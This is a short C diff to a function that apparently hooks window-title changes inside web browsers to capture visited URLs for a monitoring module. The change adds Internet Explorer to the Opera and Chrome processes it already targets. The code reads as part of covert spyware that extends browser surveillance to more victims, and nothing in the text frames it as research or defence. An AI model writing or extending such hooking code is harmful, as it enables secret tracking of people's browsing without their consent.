@@ -128,7 +128,7 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe"))
+		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "iexplore.exe"))
 			return 1; // Hooka solo opera
 	} else
 		return 1;
@@ -137,6 +137,8 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 		SendMessageURLData.browser_type = BROWSER_OPERA;
 	else if (!stricmp(proc_name, "chrome.exe"))
 		SendMessageURLData.browser_type = BROWSER_CHROME;
+	else if (!stricmp(proc_name, "iexplore.exe"))
+		SendMessageURLData.browser_type = BROWSER_IE;
 	else
 		SendMessageURLData.browser_type = BROWSER_UNKNOWN;
 
